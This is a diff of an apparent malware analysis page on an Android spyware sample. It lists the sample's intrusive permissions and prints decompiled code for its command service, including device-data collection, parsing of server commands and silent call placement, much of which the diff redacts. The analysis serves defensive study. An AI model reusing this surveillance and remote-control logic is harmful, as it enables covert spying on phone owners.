@@ -191,11 +191,11 @@ ___________________________________________________________________</pre>
 .RECEIVE_SMS                         // RECEIVE INBOUND SMS MESSAGES
 .READ_SMS                            // READ DEVICE SMS STORE
 .SEND_SMS                            // INTERACT W/ SMS MANAGER API TO SEMD TEXT & PDU SMS MESSAGES
-.READ_PHONE_STATE                    // READ ACCESS TO CELLULAR NETWORK INFO, STATUS OF ONGOING CALLS ETC 
+.READ_PHONE_STATE                    // READ ACCESS TO CELLULAR NETWORK INFO, STATUS OF  CALLS ETC 
 .PROCESS_OUTGOING_CALLS              // IDENTIFY NUMBER DURING OUTBOUND CALL, REDIRECT OR ABORT THE CALL
 .RECORD_AUDIO                        // ACCESS DEVICE MICROPHONE TO RECORD AUDIO
 .CAMERA                              // ACCESS TO THE DEVICE CAMERA
-.CALL_PHONE                          // INITIATE PHONE CALL WITHOUT UI DIALER OR CONFIRMATION FROM OWNER 
+.CALL_PHONE                          // INITIATE PHONE CALL WITHOUT UI DIALER OR CONF FROM OWNER 
 .READ_CONTACTS                       // INTERACT W/ CONTACTSCONTRACT API TO READ DEVICE CONTACTS
 .VIBRATE                             // ACCESS TO THE DEVICE DC MOTOR THAT CREATES VIBRATION
 .READ_CALL_LOG                       // READ DEVICE CALL LOG
@@ -221,7 +221,7 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
 </code>
 </pre>
   
-  <p>MainActivity SMALi:</p>
+<p><b>MainActivity SMALi:</b></p>
  
 <pre style="background-color: #100E15; border: none !important;">
 <code class="language-smali">
@@ -390,6 +390,9 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
 
     goto :goto_9
 .end method
+
+[...]
+
 </code></pre>
     
     <p>After decompiling the sample's DEX (Dalvik bytecode), SMALi/baksmali to readable JAVA/Kotlin classes; the entry point, being, the `MainActivity` class defined by `android.intent.action.MAIN` is seen to contain an `onCreate()` method invoking another class, being `CMDService` class, of which, is also invoked via the `onResume()` and `onStart()` method within the same `MainActivity` class. The following represents the `onCreate()` method which is immediatley called by Android's javac/kotlinc compiler and executed on the JVM: 
@@ -505,31 +508,19 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
       return v0_1;
     }
     if (!com.example.redacted.redacted.setting.isNetworkEnabled) {
-      v4_24 = "false";
-    } else {
-      v4_24 = "true";
-    }
+      [...]
     String v4_26;
     v1_0.put("posnetwork", v4_24);
     if (!com.example.redacted.redacted.setting.isGPSEnabled) {
-      v4_26 = "false";
-    } else {
-      v4_26 = "true";
-    }
+      [...]
     String v4_28;
     v1_0.put("posgps", v4_26);
     if (!com.example.redacted.redacted.setting.recMic) {
-      v4_28 = "false";
-    } else {
-      v4_28 = "true";
-    }
+     [...]
     String v4_30;
     v1_0.put("recMic", v4_28);
     if (!com.example.redacted.redacted.setting.recCall) {
-      v4_30 = "false";
-    } else {
-      v4_30 = "true";
-    }
+     [...]
     v1_0.put("recCall", v4_30);
     v1_0.put("smsMoniterUp", com.example.redacted.redacted.setting.smsMoniterUp);
     v1_0.put("smsMoniterDw", com.example.redacted.redacted.setting.smsMoniterDw);
@@ -540,17 +531,7 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
     v1_0.put("capPath", com.example.redacted.redacted.setting.capPath);
     v1_0.put("recPath", com.example.redacted.redacted.setting.recPath);
     v1_0.put("simSerial", this.info.getSimSerial());
-    v1_0.put("health", this.info.health);
-    v1_0.put("level", this.info.level);
-    v1_0.put("plugged", this.info.plugged);
-    v1_0.put("present", this.info.present);
-    v1_0.put("scale", this.info.scale);
-    v1_0.put("status", this.info.status);
-    v1_0.put("technology", this.info.technology);
-    v1_0.put("temperature", this.info.temperature);
-    v1_0.put("voltage", this.info.voltage);
-    v1_0.put("dirpath", android.os.Environment.getExternalStorageDirectory());
-    v1_0.put("version", com.example.redacted.redacted.setting.verion);
+    [...]
     v1_0.put("network", this.info.networkInfo());
     v1_0.put("simOperatorCode", this.info.getSimOperatorCode());
     v1_0.put("CID", "0");
@@ -569,57 +550,16 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
       }
     } catch (Exception v2_1) {
     }
-    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.redacted.redacted.CMDService$mainTask(v3_0);
-    Maybe([ARRAY, OBJECT]) v3_1 = v8_0;
-    v8_0.<init>(this, 0);
-    com.example.redacted.redacted.CMDService.timer.scheduleAtFixedRate(v3_1, ((long)com.example.redacted.redacted.setting.timerDelay), ((long)com.example.redacted.redacted.setting.timerStart));
-    return;
-  }
+    [...]
 
   private void stopMic() {
-    try {
-      com.example.redacted.redacted.setting.recMic = 0;
-    } catch (Exception v2_3) {
-      return;
-    }
-    if (this.audio == null) {
-      return;
-    } else {
-      this.audio.stoped = 1;
-      this.audio.stop();
-      return;
-    }
-  }
+    [...]
 
   private void stopRecording() {
-    try {
-      if (this.callRec == null) {
-        this.t_manager.listen(this.p_listener, 0);
-      } else {
-        this.callRec.stop();
-      }
-    } catch (Exception v2_2) {
-    }
-    return;
-  }
+    [...]
 
   public void gaveCall(org.json.JSONObject p11, String p12) {
-    try {
-      if (p11.getJSONObject("header").has("WHE")) {
-        Maybe([ARRAY, OBJECT]) v9_0 = new StringBuilder(v4_5);
-        Maybe([ARRAY, OBJECT]) v4_6 = v9_0;
-        v9_0.<init>();
-        Maybe([ARRAY, OBJECT]) v9_1 = new android.content.Intent(v5_8);
-        Maybe([ARRAY, OBJECT]) v5_9 = v9_1;
-        v9_1.<init>("android.intent.action.CALL", android.net.Uri.parse(v4_6.append("tel:").append(p11.getJSONObject("header").getString("WHE")).toString()));
-        this.intent = v5_9;
-        this.intent.setFlags(268435456);
-        this.startActivity(this.intent);
-        this.updateStatus(p12, "3");
-      }
-    } catch (Exception v4_3) {
-      this.updateStatus(p12, "-1");
-    }
+    [...]
     return;
   }
 
@@ -628,30 +568,10 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
   }
 
   public void onCreate() {
-    super.onCreate();
-    this.ctx = this;
-    Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.SystemInfo(v2_1);
-    Maybe([ARRAY, OBJECT]) v2_2 = v6_0;
-    v6_0.<init>(this.ctx);
-    this.info = v2_2;
-    android.content.Context v1_4 = this.ctx;
-    android.content.BroadcastReceiver v2_5 = this.info.batteryInfoReceiver;
-    Maybe([ARRAY, OBJECT]) v6_1 = new android.content.IntentFilter(v3_1);
-    Maybe([ARRAY, OBJECT]) v3_2 = v6_1;
-    v6_1.<init>("android.intent.action.BATTERY_CHANGED");
-    v1_4.registerReceiver(v2_5, v3_2);
-    this.startService();
-    this.hideApp();
-    return;
-  }
+    [...]
 
   public void onDestroy() {
-    super.onDestroy();
-    if (com.example.redacted.redacted.setting.errors) {
-      android.widget.Toast.makeText(this, "Service Stopped", 1).show();
-    }
-    return;
-  }
+    [...]
 
   public int onStartCommand(android.content.Intent p10, int p11, int p12) {
     Maybe([ARRAY, OBJECT]) v8_0 = new com.example.redacted.redacted.SystemInfo(v5_0);
@@ -668,100 +588,10 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
   }
 
   public void parseJson(String p11) {
-    try {
-      Maybe([ARRAY, OBJECT]) v9_0 = new org.json.JSONObject(v5_0);
-      Maybe([ARRAY, OBJECT]) v5_1 = v9_0;
-      v9_0.<init>(p11);
-      Maybe([ARRAY, OBJECT]) v2_0 = v5_1;
-    } catch (Exception v5_4) {
-      Maybe([ARRAY, OBJECT]) v2_1 = v5_4;
-      if (!com.example.redacted.redacted.setting.errors) {
-        return;
-      } else {
-        android.content.Context v5_7 = this.getBaseContext();
-        Maybe([ARRAY, OBJECT]) v9_1 = new StringBuilder(v6_2);
-        Maybe([ARRAY, OBJECT]) v6_3 = v9_1;
-        v9_1.<init>();
-        android.widget.Toast.makeText(v5_7, v6_3.append("Exception: ").append(v2_1.getMessage()).toString(), 1).show();
-        return;
-      }
-    }
-    if (!v2_0.has("header")) {
-      return;
-    } else {
-      if (!v2_0.getJSONObject("header").getString("status").equals("true")) {
-        if (!com.example.redacted.redacted.setting.errors) {
-          return;
-        } else {
-          android.content.Context v5_37 = this.getBaseContext();
-          Maybe([ARRAY, OBJECT]) v9_3 = new StringBuilder(v6_27);
-          Maybe([ARRAY, OBJECT]) v6_28 = v9_3;
-          v9_3.<init>();
-          android.widget.Toast.makeText(v5_37, v6_28.append("CMD Error: ").append(v2_0.getJSONObject("header").getString("error")).toString(), 1).show();
-          return;
-        }
-      } else {
-        if ((!v2_0.getJSONObject("header").has("CMD")) || (v2_0.getJSONObject("header").getString("CMD").equals("ping"))) {
-          return;
-        } else {
-          Maybe([ARRAY, OBJECT]) v4_0 = "0";
-          if (v2_0.getJSONObject("header").has("CID")) {
-            v4_0 = v2_0.getJSONObject("header").getString("CID");
-          }
-          this.processCMD(v2_0.getJSONObject("header").getString("CMD"), v4_0, v2_0);
-          if (!com.example.redacted.redacted.setting.errors) {
-            return;
-          } else {
-            android.content.Context v5_33 = this.getBaseContext();
-            Maybe([ARRAY, OBJECT]) v9_2 = new StringBuilder(v6_22);
-            Maybe([ARRAY, OBJECT]) v6_23 = v9_2;
-            v9_2.<init>();
-            android.widget.Toast.makeText(v5_33, v6_23.append("Other: ").append(v2_0.getJSONObject("header").getString("CMD")).toString(), 1).show();
-            return;
-          }
-        }
-      }
-    }
-  }
+    [...]
 
   public void processCMD(String p28, String p29, org.json.JSONObject p30) {
-    try {
-      Type(UNKNOWN) v6_0 = this.isConnected();
-    } catch (Exception v21_264) {
-      Maybe([ARRAY, OBJECT]) v6_1 = v21_264;
-      if (!com.example.redacted.redacted.setting.errors) {
-        return;
-      } else {
-        android.content.Context v21_267 = this.getBaseContext();
-        Maybe([ARRAY, OBJECT]) v26_31 = new StringBuilder(v22_141);
-        Maybe([ARRAY, OBJECT]) v22_142 = v26_31;
-        v26_31.<init>();
-        android.widget.Toast.makeText(v21_267, v22_142.append("Exception: ").append(v6_1.getMessage()).toString(), 1).show();
-        return;
-      }
-    }
-    if (v6_0 == null) {
-      if ((!com.example.redacted.redacted.setting.errors) || (v6_0 != null)) {
-        return;
-      } else {
-        android.widget.Toast.makeText(this.getBaseContext(), "No Internet", 1).show();
-        return;
-      }
-    } else {
-      Maybe([ARRAY, OBJECT]) v7_0 = "";
-      if (p30.getJSONObject("header").has("WHE")) {
-        v7_0 = p30.getJSONObject("header").getString("WHE");
-      }
-      if (p30.getJSONObject("header").has("VAL")) {
-        p30.getJSONObject("header").getString("VAL");
-      }
-      if (com.example.redacted.redacted.setting.errors) {
-        android.content.Context v21_19 = this.getApplicationContext();
-        Maybe([ARRAY, OBJECT]) v26_0 = new StringBuilder(v22_8);
-        Maybe([ARRAY, OBJECT]) v22_9 = v26_0;
-        v26_0.<init>();
-        android.widget.Toast.makeText(v21_19, v22_9.append("processing...command: ").append(p28).toString(), 0).show();
-      }
+    [...]
       Maybe([ARRAY, OBJECT]) v26_1 = new org.json.JSONObject(v22_13);
       Maybe([ARRAY, OBJECT]) v22_14 = v26_1;
       v26_1.<init>();
